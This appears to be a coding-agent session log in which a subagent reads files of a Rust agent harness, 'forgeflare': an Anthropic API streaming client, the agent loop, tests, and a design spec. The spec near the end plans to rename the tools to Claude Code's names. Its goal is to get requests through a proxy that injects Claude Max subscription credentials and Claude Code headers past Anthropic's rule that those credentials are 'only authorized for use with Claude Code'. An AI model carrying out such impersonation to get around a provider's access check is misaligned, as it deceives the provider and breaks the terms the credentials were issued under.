    97→
    98→pub struct AnthropicClient {
    99→    client: Client,
   100→    api_url: String,
   101→    api_key: Option<String>,
   102→}
   103→
   104→impl AnthropicClient {
   105→    pub fn new(api_url: &str) -> Self {
   106→        let client = Client::builder()
   107→            .connect_timeout(Duration::from_secs(30))
   108→            .timeout(Duration::from_secs(300))
   109→            .build()
   110→            .expect("failed to build HTTP client");
   111→
   112→        let api_key = std::env::var("ANTHROPIC_API_KEY").ok();
   113→
   114→        Self {
   115→            client,
   116→            api_url: api_url.trim_end_matches('/').to_string(),
   117→            api_key,
   118→        }
   119→    }
   120→
   121→    pub fn api_url(&self) -> &str {
   122→        &self.api_url
   123→    }
   124→
   125→    pub fn has_api_key(&self) -> bool {
   126→        self.api_key.is_some()
   127→    }
   128→
   129→    pub async fn send_message(
   130→        &self,
   131→        model: &str,
   132→        max_tokens: u32,
   133→        system: &str,
   134→        messages: &[Message],
   135→        tools: &[serde_json::Value],
   136→        stream_callback: &mut dyn FnMut(&str),
   137→    ) -> Result<(Vec<ContentBlock>, StopReason, Usage), AgentError> {
   138→        let url = format!("{}/v1/messages", self.api_url);
   139→
   140→        let mut body = serde_json::json!({
   141→            "model": model,
   142→            "max_tokens": max_tokens,
   143→            "system": [{
   144→                "type": "text",
   145→                "text": system,
   146→                "cache_control": {"type": "ephemeral"}
   147→            }],
   148→            "messages": messages,
   149→            "stream": true,
   150→        });
   151→
   152→        if !tools.is_empty() {
   153→            let mut cached_tools = tools.to_vec();
   154→            if let Some(last) = cached_tools.last_mut() {
   155→                last["cache_control"] = serde_json::json!({"type": "ephemeral"});
   156→            }
   157→            body["tools"] = serde_json::Value::Array(cached_tools);
   158→        }
   159→
   160→        let mut req = self
   161→            .client
   162→            .post(&url)
   163→            .header("anthropic-version", "2023-06-01");
   164→
   165→        if let Some(ref key) = self.api_key {
   166→            req = req.header("x-api-key", key);
   167→        }
   168→
   169→        let resp: reqwest::Response = req.json(&body).send().await?;
   170→
   171→        let status = resp.status();
   172→        if !status.is_success() {
   173→            let retry_after: Option<u64> = resp
   174→                .headers()
   175→                .get("retry-after")
   176→                .and_then(|v| v.to_str().ok())
   177→                .and_then(|s| s.parse::<u64>().ok());
   178→            let body_text = resp.text().await.unwrap_or_default();
   179→            return Err(AgentError::HttpError {
   180→                status: status.as_u16(),
   181→                retry_after,
   182→                body: body_text,
   183→            });
   184→        }
   185→
   186→        let stream = resp.bytes_stream();
   187→        parse_sse_stream(stream, stream_callback).await
   188→    }
   189→}
   190→
   191→/// Parse SSE stream into content blocks, stop reason, and usage.
   192→///
   193→/// We collect content_block_start events to initialize blocks, then
   194→/// content_block_delta events to append text or accumulate tool input JSON,
   195→/// message_start for input usage, and message_delta for stop_reason + output usage.
   196→async fn parse_sse_stream<S>(
   197→    stream: S,
   198→    callback: &mut dyn FnMut(&str),
   199→) -> Result<(Vec<ContentBlock>, StopReason, Usage), AgentError>
   200→where
   201→    S: futures_util::Stream<Item = Result<bytes::Bytes, reqwest::Error>> + Unpin,
   202→{
   203→    let mut content_blocks: Vec<ContentBlock> = Vec::new();
   204→    let mut stop_reason: Option<StopReason> = None;
   205→    let mut usage = Usage::default();
   206→    let mut buffer = String::new();
   207→
   208→    // Track in-progress tool_use input JSON accumulation per block index
   209→    let mut tool_input_bufs: std::collections::HashMap<usize, String> =
   210→        std::collections::HashMap::new();
   211→
   212→    futures_util::pin_mut!(stream);
   213→
   214→    while let Some(chunk_result) = stream.next().await {
   215→        let chunk = chunk_result.map_err(|e| AgentError::StreamTransient(e.to_string()))?;
   216→        buffer.push_str(&String::from_utf8_lossy(&chunk));
   217→
   218→        // Process complete SSE lines
   219→        while let Some(pos) = buffer.find("\n\n") {
   220→            {
   221→                let event_block = &buffer[..pos];
   222→
   223→                for line in event_block.lines() {
   224→                    if let Some(data) = line.strip_prefix("data: ") {
   225→                        if data == "[DONE]" {
   226→                            continue;
   227→                        }
   228→
   229→                        let parsed: serde_json::Value = match serde_json::from_str(data) {
   230→                            Ok(v) => v,
   231→                            Err(_) => continue,
   232→                        };
   233→
   234→                        let event_type = parsed["type"].as_str().unwrap_or("");
   235→
   236→                        match event_type {
   237→                            "message_start" => {
   238→                                if let Some(u) = parsed.get("message").and_then(|m| m.get("usage"))
   239→                                {
   240→                                    usage.input_tokens = u["input_tokens"].as_u64().unwrap_or(0);
   241→                                    usage.cache_creation_input_tokens =
   242→                                        u["cache_creation_input_tokens"].as_u64().unwrap_or(0);
   243→                                    usage.cache_read_input_tokens =
   244→                                        u["cache_read_input_tokens"].as_u64().unwrap_or(0);
   245→                                }
   246→                            }
   247→                            "content_block_start" => {
   248→                                let cb = &parsed["content_block"];
   249→                                match cb["type"].as_str() {
   250→                                    Some("text") => {
   251→                                        content_blocks.push(ContentBlock::Text {
   252→                                            text: String::new(),
   253→                                        });
   254→                                    }
   255→                                    Some("tool_use") => {
   256→                                        let idx = content_blocks.len();
   257→                                        content_blocks.push(ContentBlock::ToolUse {
   258→                                        id: cb["id"].as_str().unwrap_or("").to_string(),
   259→                                        name: cb["name"].as_str().unwrap_or("").to_string(),
   260→                                        input: serde_json::Value::Object(serde_json::Map::new()),
   261→                                    });
   262→                                        tool_input_bufs.insert(idx, String::new());
   263→                                    }
   264→                                    _ => {}
   265→                                }
   266→                            }
   267→                            "content_block_delta" => {
   268→                                let index = parsed["index"].as_u64().unwrap_or(0) as usize;
   269→                                let delta = &parsed["delta"];
   270→
   271→                                match delta["type"].as_str() {
   272→                                    Some("text_delta") => {
   273→                                        if let Some(text) = delta["text"].as_str() {
   274→                                            callback(text);
   275→                                            if let Some(ContentBlock::Text { text: ref mut t }) =
   276→                                                content_blocks.get_mut(index)
   277→                                            {
   278→                                                t.push_str(text);
   279→                                            }
   280→                                        }
   281→                                    }
   282→                                    Some("input_json_delta") => {
   283→                                        if let Some(partial) = delta["partial_json"].as_str() {
   284→                                            if let Some(buf) = tool_input_bufs.get_mut(&index) {
   285→                                                buf.push_str(partial);
   286→                                            }
   287→                                        }
   288→                                    }
   289→                                    _ => {}
   290→                                }
   291→                            }
   292→                            "content_block_stop" => {
   293→                                let index = parsed["index"].as_u64().unwrap_or(0) as usize;
   294→                                // Finalize tool_use input JSON
   295→                                if let Some(json_str) = tool_input_bufs.remove(&index) {
   296→                                    if let Some(ContentBlock::ToolUse { ref mut input, .. }) =
   297→                                        content_blocks.get_mut(index)
   298→                                    {
   299→                                        match serde_json::from_str::<serde_json::Value>(&json_str) {
   300→                                            Ok(v) => *input = v,
   301→                                            Err(e) => {
   302→                                                eprintln!(
   303→                                                    "[error] Failed to parse tool input JSON \
   304→                                                     for block {index}: {e}"
   305→                                                );
   306→                                                // Set to Null so run_pre_dispatch's null-input
   307→                                                // check catches it and produces a clean error
   308→                                                *input = serde_json::Value::Null;
   309→                                            }
   310→                                        }
   311→                                    }
   312→                                }
   313→                            }
   314→                            "message_delta" => {
   315→                                if let Some(sr) = parsed["delta"]["stop_reason"].as_str() {
   316→                                    stop_reason = match sr {
   317→                                        "end_turn" => Some(StopReason::EndTurn),
   318→                                        "max_tokens" => Some(StopReason::MaxTokens),
   319→                                        "tool_use" => Some(StopReason::ToolUse),
   320→                                        _ => None,
   321→                                    };
   322→                                }
   323→                                if let Some(u) = parsed.get("usage") {
   324→                                    usage.output_tokens = u["output_tokens"].as_u64().unwrap_or(0);
   325→                                }
   326→                            }
   327→                            "error" => {
   328→                                let err_type =
   329→                                    parsed["error"]["type"].as_str().unwrap_or("unknown");
   330→                                let err_msg = parsed["error"]["message"]
   331→                                    .as_str()
   332→                                    .unwrap_or("unknown error");
   333→                                match err_type {
   334→                                    "overloaded_error" | "api_error" | "rate_limit_error" => {
   335→                                        return Err(AgentError::StreamTransient(format!(
   336→                                            "{err_type}: {err_msg}"
   337→                                        )));
   338→                                    }
   339→                                    _ => {
   340→                                        return Err(AgentError::StreamParse(format!(
   341→                                            "{err_type}: {err_msg}"
   342→                                        )));
   343→                                    }
   344→                                }
   345→                            }
   346→                            _ => {}
   347→                        }
   348→                    }
   349→                }
   350→            }
   351→            buffer.drain(..pos + 2);
   352→        }
   353→    }
   354→
   355→    let stop = stop_reason.ok_or_else(|| {
   356→        AgentError::StreamTransient(
   357→            "stream ended without stop_reason (connection drop)".to_string(),
   358→        )
   359→    })?;
   360→
   361→    Ok((content_blocks, stop, usage))
   362→}
   363→
   364→#[cfg(test)]
   365→mod tests {
   366→    use super::*;
   367→
   368→    #[test]
   369→    fn stop_reason_serialization() {
   370→        assert_eq!(
   371→            serde_json::to_string(&StopReason::EndTurn).unwrap(),
   372→            "\"end_turn\""
   373→        );
   374→        assert_eq!(
   375→            serde_json::to_string(&StopReason::ToolUse).unwrap(),
   376→            "\"tool_use\""
   377→        );
   378→        assert_eq!(
   379→            serde_json::to_string(&StopReason::MaxTokens).unwrap(),
   380→            "\"max_tokens\""
   381→        );
   382→    }
   383→
   384→    #[test]
   385→    fn content_block_text_roundtrip() {

   393→
   394→    #[test]
   395→    fn content_block_tool_use_roundtrip() {
   396→        let block = ContentBlock::ToolUse {

    26→#[derive(Debug, PartialEq)]
    27→enum InstructionsResult {
    28→    Found { filename: String, contents: String },
    29→    Skipped { filename: String, reason: String },
    30→    NotFound,
    31→}
    32→
    33→/// Search cwd for CLAUDE.md then AGENTS.md. First match wins.
    34→/// Returns Found on success, Skipped if a candidate exists but can't be loaded
    35→/// (size limit, permissions), or NotFound if neither file exists.
    36→fn load_project_instructions() -> InstructionsResult {
    37→    let candidates = ["CLAUDE.md", "AGENTS.md"];
    38→    let mut last_skipped: Option<InstructionsResult> = None;
    39→
    40→    for candidate in &candidates {
    41→        let metadata = match std::fs::metadata(candidate) {
    42→            Ok(m) => m,
    43→            Err(_) => continue, // file not found or dangling symlink
    44→        };
    45→
    46→        if metadata.len() as usize > PROJECT_INSTRUCTIONS_MAX_BYTES {
    47→            last_skipped = Some(InstructionsResult::Skipped {
    48→                filename: candidate.to_string(),
    49→                reason: "exceeds 32KB".to_string(),
    50→            });
    51→            continue;
    52→        }
    53→
    54→        match std::fs::read_to_string(candidate) {
    55→            Ok(contents) => {
    56→                return InstructionsResult::Found {
    57→                    filename: candidate.to_string(),
    58→                    contents,
    59→                };
    60→            }
    61→            Err(e) => {
    62→                last_skipped = Some(InstructionsResult::Skipped {
    63→                    filename: candidate.to_string(),
    64→                    reason: e.to_string(),
    65→                });
    66→                continue;
    67→            }
    68→        }
    69→    }
    70→
    71→    last_skipped.unwrap_or(InstructionsResult::NotFound)
    72→}

   101→fn build_system_prompt() -> String {

   103→        .map(|p| p.display().to_string())
   104→        .unwrap_or_else(|_| ".".to_string());

   107→    format!(
   108→        "You are a coding assistant with access to tools for reading, searching, editing files, \
   109→         and running commands.\n\n\
   110→         Environment:\n\
   111→         - Working directory: {cwd}\n\
   112→         - Platform: {platform}\n\n\
   113→         Available tools (use PascalCase names exactly):\n\
   114→         - Read: Read file contents (max 1MB)\n\
   115→         - Glob: List files matching a pattern (max 1000 entries)\n\
   116→         - Bash: Execute shell commands (120s timeout)\n\
   117→         - Edit: Edit files with exact text replacement (max 100KB, use replace_all for bulk)\n\
   118→         - Grep: Search file contents with ripgrep (max 50 matches)\n\n\
   119→         Guidelines:\n\
   120→         - Read files before editing them\n\
   121→         - Use Grep to find code before making changes\n\
   122→         - Prefer targeted edits over full file rewrites\n\
   123→         - Explain what you're doing and why"

   127→/// Trim conversation at exchange boundaries to fit within context budget.
   128→/// Preserves the first user message and trims from the front, keeping
   129→/// tool_use/tool_result pairs together.
   130→fn trim_conversation(messages: &mut Vec<Message>) {
   131→    let size: usize = messages
   132→        .iter()
   133→        .map(|m| serde_json::to_string(m).unwrap_or_default().len())
   134→        .sum();
   135→
   136→    if size <= CONTEXT_BUDGET_BYTES || messages.len() <= 2 {
   137→        return;
   138→    }
   139→
   140→    // Keep first message, trim from front of the rest
   141→    let first = messages.remove(0);
   142→    while messages.len() > 1 {
   143→        let new_size: usize = std::iter::once(&first)
   144→            .chain(messages.iter())
   145→            .map(|m| serde_json::to_string(m).unwrap_or_default().len())
   146→            .sum();
   147→        if new_size <= CONTEXT_BUDGET_BYTES {
   148→            break;
   149→        }
   150→        // Remove pairs to maintain alternation
   151→        messages.remove(0);
   152→        if !messages.is_empty() && messages[0].role == "assistant" {
   153→            messages.remove(0);
   154→        }
   155→    }
   156→    messages.insert(0, first);
   157→}
   158→
   159→/// Gate trim_conversation on actual token usage from the API.
   160→/// - last_input_tokens == 0: no data yet, run byte-based trim (safety net)
   161→/// - last_input_tokens > 0 && < TRIM_THRESHOLD: skip trim (context is safe)
   162→/// - last_input_tokens >= TRIM_THRESHOLD: run byte-based trim
   163→fn trim_if_needed(messages: &mut Vec<Message>, last_input_tokens: u64) {
   164→    if last_input_tokens == 0 || last_input_tokens >= TRIM_THRESHOLD {
   165→        trim_conversation(messages);
   166→    }
   167→}
   168→
   169→/// Recover conversation alternation after API errors.
   170→/// Pops trailing User message and any orphaned tool_use to maintain
   171→/// the user/assistant alternation invariant.
   172→fn recover_conversation(messages: &mut Vec<Message>) {
   173→    // Guard: never empty the conversation entirely — at minimum keep the
   174→    // first user message so the next API call has something to send.
   175→    if messages.len() <= 1 {
   176→        return;
   177→    }
   178→    // Pop trailing user message if present (but keep at least 1 message)
   179→    if messages.len() > 1 {
   180→        if let Some(last) = messages.last() {
   181→            if last.role == "user" {
   182→                messages.pop();
   183→            }
   184→        }
   185→    }
   186→    // Pop trailing assistant message that has only tool_use blocks (orphaned)
   187→    if messages.len() > 1 {
   188→        if let Some(last) = messages.last() {
   189→            if last.role == "assistant" {
   190→                let only_tool_use = last
   191→                    .content
   192→                    .iter()
   193→                    .all(|b| matches!(b, ContentBlock::ToolUse { .. }));
   194→                if only_tool_use {
   195→                    messages.pop();
   196→                    // Also pop the user message before it to maintain alternation
   197→                    if messages.len() > 1 {
   198→                        if let Some(last) = messages.last() {
   199→                            if last.role == "user" {
   200→                                messages.pop();
   201→                            }
   202→                        }
   203→                    }
   204→                }
   205→            }
   206→        }
   207→    }
   208→}

   214→/// Filter out null-input tool_use blocks from MaxTokens truncation.
   215→/// Returns the filtered blocks. If all tool_use blocks had null input

   217→fn filter_null_input_tool_use(blocks: Vec<ContentBlock>) -> Vec<ContentBlock> {
   218→    let filtered: Vec<ContentBlock> = blocks
   219→        .into_iter()
   220→        .filter(|b| {
   221→            if let ContentBlock::ToolUse { input, .. } = b {
   222→                !input.is_null()

   224→                true

   226→        })

   228→
   229→    if filtered.is_empty() {
   230→        vec![ContentBlock::Text {
   231→            text: "[Response truncated]".to_string(),
   232→        }]
   233→    } else {
   234→        filtered
   235→    }
   236→}

   296→/// Unified post-dispatch protocol for both parallel and sequential paths.
   297→/// Formats and logs the result, then runs post-hooks. Returns true if a
   298→/// convergence signal was received (caller should set signal_break).
   299→async fn run_post_dispatch(
   300→    hooks: &HookRunner,
   301→    name: &str,
   302→    input: &serde_json::Value,
   303→    content: &str,
   304→    is_error: bool,
   305→    iterations: usize,
   306→    verbose: bool,
   307→) -> bool {
   308→    let display = format_tool_result_display(content, is_error, verbose);
   309→    eprintln!("{display}");
   310→
   311→    let post_result = hooks
   312→        .run_post_tool_use(name, input, content, is_error, iterations)
   313→        .await;
   314→    matches!(post_result, PostToolResult::Signal { .. })
   315→}

   317→fn log_tool_dispatch(name: &str, input: &serde_json::Value, verbose: bool) {
   318→    if verbose {
   319→        eprintln!("\n[tool] {name}({})", truncate_json(input, 100));

   325→fn threshold_reason_str(consecutive_block_count: usize) -> &'static str {
   326→    if consecutive_block_count >= MAX_CONSECUTIVE_BLOCKS {
   327→        "block_limit_consecutive"

   333→/// Dispatch a tool and wrap the result as a ContentBlock::ToolResult.
   334→/// Used by the parallel path inside spawn_blocking.
   335→fn dispatch_to_tool_result(id: String, name: String, input: serde_json::Value) -> ContentBlock {
   336→    let result = dispatch_tool(&name, &input, &mut |_: &str| {});
   337→    let (content, is_error) = match result {
   338→        Ok(output) => (output, false),
   339→        Err(err) => (err, true),
   340→    };
   341→    ContentBlock::ToolResult {
   342→        tool_use_id: id,
   343→        content,
   344→        is_error: if is_error { Some(true) } else { None },
   345→    }
   346→}
   347→
   348→/// Join spawned parallel futures into their slots, handling panics.
   349→async fn join_spawned_futures(
   350→    futures: Vec<(usize, tokio::task::JoinHandle<ContentBlock>)>,
   351→    slots: &mut [Option<ContentBlock>],
   352→    tool_ids: &[(String, String, serde_json::Value)],
   353→) {
   354→    let handles: Vec<_> = futures
   355→        .into_iter()
   356→        .map(|(idx, h)| async move { (idx, h.await) })
   357→        .collect();
   358→    for (idx, result) in futures_util::future::join_all(handles).await {
   359→        slots[idx] = Some(match result {
   360→            Ok(block) => block,
   361→            Err(_) => ContentBlock::ToolResult {
   362→                tool_use_id: tool_ids[idx].0.clone(),
   363→                content: "tool panicked".to_string(),
   364→                is_error: Some(true),
   365→            },
   366→        });
   367→    }
   368→}
   369→
   370→fn format_tool_result_display(result: &str, is_error: bool, verbose: bool) -> String {
   371→    if is_error {
   372→        let preview = if result.len() > 200 {
   373→            format!("{}...", &result[..result.floor_char_boundary(200)])
   374→        } else {
   375→            result.to_string()
   376→        };
   377→        format!("  Error: {preview}")
   378→    } else if verbose {
   379→        result.to_string()
   380→    } else {
   381→        format!("  ({} chars)", result.len())
   382→    }
   383→}

   873→fn truncate_json(value: &serde_json::Value, max_len: usize) -> String {
   874→    let s = value.to_string();
   875→    if s.len() <= max_len {
   876→        s
   877→    } else {
   878→        format!("{}...", &s[..s.floor_char_boundary(max_len)])
   879→    }
   880→}

   882→const MAX_CONTINUATIONS: usize = 3;

   884→/// Determine what to do after a MaxTokens stop_reason.
   885→/// Returns the action to take given the filtered content blocks and current continuation count.
   886→#[derive(Debug, PartialEq)]
   887→enum MaxTokensAction {
   888→    /// Response was empty (only placeholder) — break immediately
   889→    BreakEmpty,
   890→    /// Valid tool_use blocks present — fall through to tool dispatch
   891→    DispatchTools,
   892→    /// Text-only, under cap — inject continuation prompt
   893→    Continue,
   894→    /// Text-only, cap reached — break
   895→    BreakCapReached,
   896→}
   897→
   898→fn classify_max_tokens(blocks: &[ContentBlock], continuation_count: usize) -> MaxTokensAction {

   901→        && matches!(&blocks[0], ContentBlock::Text { text } if text == "[Response truncated]");

   903→        return MaxTokensAction::BreakEmpty;
   904→    }
   905→
   906→    let has_valid_tools = blocks
   907→        .iter()
   908→        .any(|b| matches!(b, ContentBlock::ToolUse { .. }));
   909→
   910→    if has_valid_tools {
   911→        MaxTokensAction::DispatchTools
   912→    } else if continuation_count < MAX_CONTINUATIONS {
   913→        MaxTokensAction::Continue
   914→    } else {

  1391→    #[tokio::test]
  1392→    async fn parallel_reads_faster_than_sequential() {
  1393→        // 3 concurrent Reads should complete faster than sequential.
  1394→        // We use Bash(sleep) dispatches wrapped in spawn_blocking to measure concurrency,
  1395→        // but instead we'll use actual Read calls which are fast I/O.
  1396→        // Create temp files and verify parallel is at least not slower.
  1397→        let dir = std::env::temp_dir().join("forgeflare_parallel_test");
  1398→        let _ = std::fs::create_dir_all(&dir);
  1399→        for i in 0..3 {
  1400→            std::fs::write(dir.join(format!("file{i}.txt")), format!("content {i}")).unwrap();
  1401→        }
  1402→
  1403→        let files: Vec<_> = (0..3)
  1404→            .map(|i| {
  1405→                dir.join(format!("file{i}.txt"))
  1406→                    .to_str()
  1407→                    .unwrap()
  1408→                    .to_string()
  1409→            })
  1410→            .collect();
  1411→
  1412→        // Parallel: use join_all with spawn_blocking
  1413→        let start = std::time::Instant::now();
  1414→        let handles: Vec<_> = files
  1415→            .iter()

  1449→    #[tokio::test]
  1450→    async fn parallel_tool_error_doesnt_cancel_siblings() {
  1451→        // One failing Read should not prevent other Reads from completing
  1452→        let dir = std::env::temp_dir().join("forgeflare_parallel_error_test");
  1453→        let _ = std::fs::create_dir_all(&dir);
  1454→        std::fs::write(dir.join("exists.txt"), "hello").unwrap();
  1455→
  1456→        let inputs = vec![
  1457→            ("id1", dir.join("exists.txt").to_str().unwrap().to_string()),
  1458→            (
  1459→                "id2",
  1460→                "/nonexistent/file_that_does_not_exist.txt".to_string(),
  1461→            ),
  1462→            ("id3", dir.join("exists.txt").to_str().unwrap().to_string()),
  1463→        ];
  1464→
  1465→        let handles: Vec<_> = inputs
  1466→            .iter()
  1467→            .map(|(id, f)| {
  1468→                let id = id.to_string();
  1469→                let f = f.clone();
  1470→                tokio::task::spawn_blocking(move || {
  1471→                    let result =
  1472→                        dispatch_tool("Read", &serde_json::json!({"file_path": f}), &mut |_| {});
  1473→                    let (content, is_error) = match result {
  1474→                        Ok(output) => (output, false),
  1475→                        Err(err) => (err, true),
  1476→                    };
  1477→                    ContentBlock::ToolResult {
  1478→                        tool_use_id: id,
  1479→                        content,
  1480→                        is_error: if is_error { Some(true) } else { None },
  1481→                    }
  1482→                })
  1483→            })
  1484→            .collect();
  1485→
  1486→        let results = futures_util::future::join_all(handles).await;
  1487→
  1488→        // First should succeed
  1489→        let r0 = results[0].as_ref().unwrap();
  1490→        if let ContentBlock::ToolResult { is_error, .. } = r0 {
  1491→            assert!(is_error.is_none(), "first read should succeed");
  1492→        }
  1493→        // Second should fail
  1494→        let r1 = results[1].as_ref().unwrap();
  1495→        if let ContentBlock::ToolResult {
  1496→            is_error, content, ..
  1497→        } = r1
  1498→        {
  1499→            assert_eq!(*is_error, Some(true), "missing file should error");
  1500→            assert!(content.contains("not found"));
  1501→        }
  1502→        // Third should succeed (not cancelled by second's failure)
  1503→        let r2 = results[2].as_ref().unwrap();
  1504→        if let ContentBlock::ToolResult { is_error, .. } = r2 {
  1505→            assert!(
  1506→                is_error.is_none(),
  1507→                "third read should succeed despite second failing"
  1508→            );
  1509→        }
  1510→
  1511→        let _ = std::fs::remove_dir_all(&dir);
  1512→    }

  1703→    // --- Project Instructions Loading Tests ---
  1704→    //
  1705→    // Each test creates a temp directory and sets it as cwd for the duration of the test.
  1706→    // This isolates tests from the real working directory and from each other.
  1707→    // Uses a mutex to prevent parallel tests from racing on set_current_dir.
  1708→
  1709→    use std::sync::Mutex;
  1710→    static CWD_MUTEX: Mutex<()> = Mutex::new(());
  1711→
  1712→    /// Helper: run a closure with a temporary directory as cwd, then restore.
  1713→    fn with_temp_cwd<F: FnOnce(&std::path::Path)>(f: F) {
  1714→        let _lock = CWD_MUTEX.lock().unwrap();
  1715→        let original = std::env::current_dir().unwrap();
  1716→        let tmp = tempfile::tempdir().unwrap();
  1717→        std::env::set_current_dir(tmp.path()).unwrap();
  1718→        f(tmp.path());
  1719→        std::env::set_current_dir(original).unwrap();
  1720→    }
  1721→
  1722→    #[test]
  1723→    fn instructions_loads_claude_md() {
  1724→        with_temp_cwd(|dir| {
  1725→            std::fs::write(dir.join("CLAUDE.md"), "build instructions here").unwrap();
  1726→            let result = load_project_instructions();
  1727→            match result {
  1728→                InstructionsResult::Found { filename, contents } => {
  1729→                    assert_eq!(filename, "CLAUDE.md");
  1730→                    assert_eq!(contents, "build instructions here");
  1731→                }
  1732→                other => panic!("expected Found, got {:?}", other),
  1733→            }
  1734→        });
  1735→    }

  1900→    #[tokio::test]
  1901→    async fn pre_dispatch_null_input_returns_blocked_error() {
  1902→        // Null-input tool_use should produce a Blocked result with error ToolResult,
  1903→        // without touching hooks at all.
  1904→        let hooks = HookRunner::load("/nonexistent/hooks.toml", "/tmp");
  1905→        let mut consecutive = 0usize;
  1906→        let mut total = 0usize;
  1907→        let result = run_pre_dispatch(
  1908→            &hooks,
  1909→            "tu_1",
  1910→            "Bash",
  1911→            &serde_json::Value::Null,
  1912→            0,
  1913→            &mut consecutive,
  1914→            &mut total,
  1915→        )
  1916→        .await;
  1917→        match result {
  1918→            PreDispatchResult::Blocked(ContentBlock::ToolResult {
  1919→                tool_use_id,
  1920→                content,
  1921→                is_error,
  1922→            }) => {
  1923→                assert_eq!(tool_use_id, "tu_1");
  1924→                assert!(content.contains("null input"));
  1925→                assert_eq!(is_error, Some(true));
  1926→            }
  1927→            other => panic!("expected Blocked for null input, got {:?}", other),
  1928→        }
  1929→        // Block counts should NOT be incremented for null-input (it's not a hook block)
  1930→        assert_eq!(consecutive, 0);
  1931→        assert_eq!(total, 0);
  1932→    }

     5→
     6→# Tool Name Compliance Specification
     7→
     8→**Target:** Rename forgeflare's tool names to match Claude Code conventions for OAuth proxy compatibility
     9→
    10→---
    11→
    12→## Why
    13→
    14→Anthropic validates tool names against Claude Code's known tool set when requests carry OAuth credentials (Claude Max subscription). The tailnet OAuth proxy injects these credentials for clients that don't provide their own API key. Requests without tools pass (200). Requests with tools succeed only when tool names match Claude Code's PascalCase naming convention.
    15→
    16→Empirically verified:
    17→
    18→- `"tools":[{"name":"bash",...}]` → 400 ("This credential is only authorized for use with Claude Code")
    19→- `"tools":[{"name":"Bash",...}]` → 200 (Sonnet responds with tool_use)
    20→- No `tools` field → 200
    21→
    22→The proxy already injects Bearer token, user-agent, system prompt prefix, beta flags, and browser-access header. Tool names are the remaining validation gate.
    23→
    24→---
    25→
    26→## Requirements
    27→
    28→**R1. Rename Tool Schemas**
    29→
    30→Update the `tools!` macro invocations in `tools/mod.rs` to use Claude Code naming:
    31→
    32→| Current | Target |
    33→|---------|--------|
    34→| `read_file` | `Read` |
    35→| `list_files` | `Glob` |
    36→| `bash` | `Bash` |
    37→| `edit_file` | `Edit` |
    38→| `code_search` | `Grep` |
    39→
    40→Only the `name` field changes. Descriptions and input schemas stay as-is (Anthropic validates the name, not the schema shape or description).
    41→
    42→**R2. Update Dispatch Match Arms**
    43→
    44→Update `dispatch_tool()` match arms from old names to new names. The unknown-tool fallback continues to catch mismatches.
    45→
    46→**R3. Update System Prompt**
    47→
    48→Update `build_system_prompt()` in `main.rs` to reference new tool names (`Read`, `Glob`, `Bash`, `Edit`, `Grep`). The model sees tool names in both the schema and the system prompt; they must agree.
    49→
    50→**R4. Update Tests**
    51→
    52→All tests that reference tool names by string must be updated. This includes:
    53→
    54→- `schemas_returns_five` (checks for old names)
    55→- `dispatch_known_tool` / `dispatch_unknown_tool` (dispatches by name)
    56→- SSE parser tests (tool_use blocks with old names in test fixtures)
    57→- `system_prompt_contains_environment_info` (checks for old names)
    58→- `main.rs` test helpers (`assistant_tool_use` uses `"bash"`)
    59→
    60→**R5. Update AGENTS.md**
    61→
    62→Update the tool listing in `AGENTS.md` (project structure description) to reflect new names.
    63→
    64→---
    65→
    66→## Architecture
    67→
    68→No structural changes. This is a pure rename across four touch points:
    69→
    70→```text
    71→tools/mod.rs
    72→  ├── tools! macro      → rename schema name strings
    73→  └── dispatch_tool()   → rename match arm strings
    74→
    75→main.rs
    76→  ├── build_system_prompt() → rename tool references in prompt text
    77→  └── tests                 → rename tool name strings in fixtures
    78→
    79→api.rs
    80→  └── tests                 → rename tool name strings in SSE fixtures
    81→
    82→AGENTS.md
    83→  └── tool listing          → rename in documentation
    84→```
    85→
    86→The dispatch flow is unchanged:
    87→
    88→```text
    89→API response → tool_use.name ("Bash") → dispatch_tool("Bash", ...) → bash_exec()
    90→```
    91→
    92→Internal function names (`read_exec`, `list_exec`, `bash_exec`, `edit_exec`, `search_exec`) do not change. They are internal implementation details, not wire-protocol names.
    93→
    94→---
    95→
    96→## Success Criteria
    97→
    98→- [ ] `cargo test` passes with all tool names updated
    99→- [ ] `cargo clippy -- -D warnings` clean
   100→- [ ] `all_tool_schemas()` returns schemas with names `Read`, `Glob`, `Bash`, `Edit`, `Grep`
   101→- [ ] Requests through OAuth proxy with tools succeed
   102→- [ ] Direct API key mode continues to work (tool names are valid regardless of auth method)
   103→- [ ] System prompt tool guidance references new names
   104→
   105→---
   106→
   107→## Non-Goals
   108→
   109→- Changing tool behavior, parameters, or schemas (only the `name` field changes)
   110→- Adding new tools or removing existing ones
   111→- Proxy-side tool name mapping (rejected — fragile, maintenance burden, unnecessary indirection)
   112→- Matching Claude Code's full tool set (forgeflare only needs its 5 tools to pass validation)
   113→- Changing internal function names (`bash_exec`, `read_exec`, etc.)
   114→
   115→---
   116→
   117→## Implementation Notes
   118→
   119→- The `Glob` name for `list_files` is a pragmatic choice: Claude Code's `Glob` is the closest file-listing tool. The actual behavior (directory listing vs glob pattern matching) differs, but Anthropic validates the name, not the behavior. The model will learn forgeflare's `Glob` semantics from the schema description and system prompt.
   120→- The `Grep` name for `code_search` follows the same logic. Claude Code's `Grep` wraps ripgrep; forgeflare's `code_search` also wraps ripgrep. Functionally equivalent.
   121→- `Read` and `Edit` are direct equivalents. `Bash` is identical.
   122→- The `generic-client-support.md` spec in tailnet-microservices should be updated to document tool name validation as a resolved finding, and the success criterion "zero client-side changes" should be amended to acknowledge the tool name rename.
   123→"}]},"uuid":"0afeb032-87b6-4d62-ab6f-5f9e65c57072","timestamp":"2026-03-12T04:45:41.114Z","sourceToolAssistantUUID":"3e326fde-7930-4083-8e9f-3af02cb37447","userType":"external","cwd":"/Users/basher8383/3I/forge/forgeflare-hooks","sessionId":"8aac52da-2edf-4887-bae8-ee91f66f8d8c","version":"2.1.74","gitBranch":"main","slug":"peaceful-plotting-wand"}

{"parentUuid":"876fc3cb-4bd5-4382-9b6b-8e9761948cc2","isSidechain":true,"promptId":"a139a8f1-461e-470a-a74c-542f892f5706","agentId":"ad11574e87b86df02","type":"user","message":{"role":"user","content":[{"tool_use_id":"REDACTED","type":"tool_result","content":"     1→---
     2→status: Complete
     3→created: 2026-02-14
     4→---
     5→
     6→# Parallel Dispatch for Pure Tools
     7→
     8→**Target:** Classify tools by side effects and execute read-only tools concurrently within a single tool batch
     9→
    10→---
    11→
    12→## Why
    13→
